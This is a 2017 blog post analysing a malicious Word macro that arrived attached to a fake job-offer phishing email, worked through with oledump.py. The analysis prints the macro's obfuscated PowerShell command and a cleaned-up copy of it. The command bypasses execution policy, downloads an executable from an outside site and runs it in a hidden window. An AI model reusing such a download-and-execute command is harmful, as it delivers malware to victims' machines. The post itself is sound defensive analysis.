@@ -1,0 +1,68 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Analysis of a Word macro virus - 2701.doc - SixFoisNeuf</title><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:title" content="Analysis of a Word macro virus - 2701.doc"><meta property="og:description" content="On 2017-01-27, I received a suspicious email on an address I no longer use.
+EDIT: I received two more emails with the same file, only the message was different. Is it a recent ongoing spam campaign?
+ Hello,
+  My name is Adam Buchbinder, I saw your GitHub repo and i&rsquo;m pretty amazed. The point is that i have an open position in my company and looks like you are a good fit."><meta property="og:type" content="article"><meta property="og:url" content="https://sixfoisneuf.fr/posts/analysis-of-a-word-macro-virus-2701-dot-doc/"><meta property="article:published_time" content="2017-01-27T10:46:08+01:00"><meta property="article:modified_time" content="2017-01-27T10:46:08+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Analysis of a Word macro virus - 2701.doc"><meta name=twitter:description content="On 2017-01-27, I received a suspicious email on an address I no longer use.
+EDIT: I received two more emails with the same file, only the message was different. Is it a recent ongoing spam campaign?
+ Hello,
+  My name is Adam Buchbinder, I saw your GitHub repo and i&rsquo;m pretty amazed. The point is that i have an open position in my company and looks like you are a good fit."><link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://sixfoisneuf.fr/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://sixfoisneuf.fr/css/main.css><script src=https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js></script><script src=https://sixfoisneuf.fr/js/main.js></script></head><body><div class="container wrapper post"><div class=header><base href=https://sixfoisneuf.fr/><h1 class=site-title><a href=https://sixfoisneuf.fr/>SixFoisNeuf</a></h1><div class=site-description><h2>Systems administration, DFIR and malware analysis</h2><nav class="nav social"><ul class=flat><a href=https://twitter.com/simsor title=Twitter><i data-feather=twitter></i></a><a href=https://github.com/simsor title=GitHub><i data-feather=github></i></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>Home</a></li><li><a href=/about>About me</a></li><li><a href=/posts/index.xml>RSS</a></li></ul></nav></div><div class=post-header><h1 class=title>Analysis of a Word macro virus - 2701.doc</h1><div class=meta>Posted at &mdash; Jan 27, 2017</div></div><div class=markdown><p>On 2017-01-27, I received a suspicious email on an address I no longer use.</p><p>EDIT: I received two more emails with the same file, only the message was different. Is it a recent ongoing spam campaign?</p><blockquote><p>Hello,</p></blockquote><blockquote><p>My name is Adam Buchbinder, I saw your GitHub repo and i&rsquo;m pretty amazed.
+The point is that i have an open position in my company and looks like you
+are a good fit.</p></blockquote><blockquote><p>Please take a look into attachment to find details about company and job.
+Dont hesitate to contact me directly via email highlighted in the document below.</p></blockquote><blockquote><p>Thanks and regards,
+Adam.</p></blockquote><p>Gmail refused to synchronise this email, saying it contained &ldquo;a virus or a suspicious attached file&rdquo;. Indeed, opening the attached .doc file on my phone, I only saw a yellow screen telling me to &ldquo;Enable macros to see this document&rdquo;. Highly suspicous!</p><p>According to VirusTotal, only 4/54 AVs detected this file as a threat.</p><p><img src=/images/vt_2701_doc.png alt="VirusTotal analysis"></p><p>I transfered the file to my computer to analyse it using Didier Stevens&rsquo;s fantastic <a href=https://blog.didierstevens.com/programs/oledump-py/>oledump.py</a>. First of all, I wanted to see what the malicious code looked like. This is easily done by checking which streams contain executable VBA code:</p><p><code>./oledump.py 2701.doc</code></p><pre><code>1:       114 '\x01CompObj'
+2:      4096 '\x05DocumentSummaryInformation'
+3:      4096 '\x05SummaryInformation'
+4:     11555 '1Table'
+5:       367 'Macros/PROJECT'
+6:        41 'Macros/PROJECTwm'
+7: M   84985 'Macros/VBA/ThisDocument'
+8:     16765 'Macros/VBA/_VBA_PROJECT'
+9:       517 'Macros/VBA/dir'
+10:       216 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Item'
+11:       341 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Properties'
+12:     15974 'WordDocument'
+</code></pre><p>We can see that stream number 7 contains VBA code, so we&rsquo;ll extract it using the <code>-s</code> and <code>-v</code> switches.</p><p><code>./oledump.py 2701.doc -s 7 -v</code></p><pre><code>Attribute VB_Name = &quot;ThisDocument&quot;
+Attribute VB_Base = &quot;1Normal.ThisDocument&quot;
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Function ytesobpu()
+ytesobpu = &quot;oswoqhy&quot;
+
+...snipping about 2000 lines...
+
+yvluxju = &quot;24940&quot;
+urucahinc = &quot;99405&quot;
+tniwfi = &quot;yjunyk&quot;
+bcukifx = &quot;75236&quot;
+mfihmuwz = &quot;12310&quot;
+ymuba = tniwfi + bcukifx &amp; &quot;10481&quot; + egebi &amp; mfihmuwz
+ 
+End If
+
+End Sub
+</code></pre><p>Okay, if you want to sniff through it <a href=/assets/documents/2701.doc.vba>go ahead</a>, but I&rsquo;m no doing it. oledump has a nice option to try and extract any HTTP calls in an OLE document, so we&rsquo;ll just use that.</p><p><code>./oledump.py 2701.doc -p plugin_http_heuristics</code></p><pre><code>1:       114 '\x01CompObj'
+2:      4096 '\x05DocumentSummaryInformation'
+3:      4096 '\x05SummaryInformation'
+4:     11555 '1Table'
+5:       367 'Macros/PROJECT'
+6:        41 'Macros/PROJECTwm'
+7: M   84985 'Macros/VBA/ThisDocument'
+           Plugin: HTTP Heuristics plugin 
+             &quot;CMD.exe /C poWe^RsH^E^lL.EX^e     ^-eXE^CUT^I^o^n^Po^LI^Cy byp^As^s^    ^-N^Opr^O^Fi^l^e -^winDowST^yLE^    h^IDden   ^(n^e^W-O^bje^CT^    s^ySte^M^.^NET.W^Eb^cLi^En^T^)^.^dOW^Nl^oa^d^FI^lE('http://nicklovegrove.co.uk/wp-content/margin2601_onechat_word.exe','%APPdAta%.Exe');s^TArT-pRO^C^Es^S '%APpdaTa%.ExE'&quot;
+8:     16765 'Macros/VBA/_VBA_PROJECT'
+9:       517 'Macros/VBA/dir'
+10:       216 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Item'
+11:       341 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Properties'
+12:     15974 'WordDocument'
+</code></pre><p>By cleaning up the command, here&rsquo;s what we can see:</p><div class=highlight><pre style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cmd.exe /C powershell.exe 
+-executionPolicy bypass 
+-noProfile 
+-windowStyle hidden 
+(newObject System.NET.WebClient)
+    .downloadFile(<span style=color:#a31515>&#39;http://nicklovegrove.co.uk/wp-content/margin2601_onechat_word.exe&#39;</span>, 
+                  <span style=color:#a31515>&#39;%APPDATA%.exe&#39;</span>); 
+start-process <span style=color:#a31515>&#39;%APPDATA%.exe&#39;</span>
+</code></pre></div><p>Looks like the macro tries to download a file at <a href=http://nicklovegrove.co.uk>http://nicklovegrove.co.uk</a> , probably a hacked WordPress site (seriously, update your WordPress!).</p><p>This file <code>margin2601_onechat_word.exe</code> gets a score of 6/54 on VirusTotal.</p><p><img src=/images/vt_margin_exe.png alt="VirusTotal&rsquo;s result on the EXE file"></p><p>Analysing it on <a href=https://hybrid-analysis.com>Hybrid-Analysis</a> shows that the virus drops a malicious DLL file (<code>bckedip.dll</code>) on the target machine (the file is detected as a trojan). It also does POST requests to <code>onechat.pw</code>.</p><p><a href="https://www.hybrid-analysis.com/sample/3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22?environmentId=100">Here&rsquo;s a link to the analysis</a></p><p>Further analysis on a Virtual Machine could be interesting.</p></div><div class=post-tags></div></div><div class="footer wrapper"><nav class=nav><div><a href=https://github.com/vividvilla/ezhil>Ezhil theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></nav></div><script>feather.replace()</script></body></html>
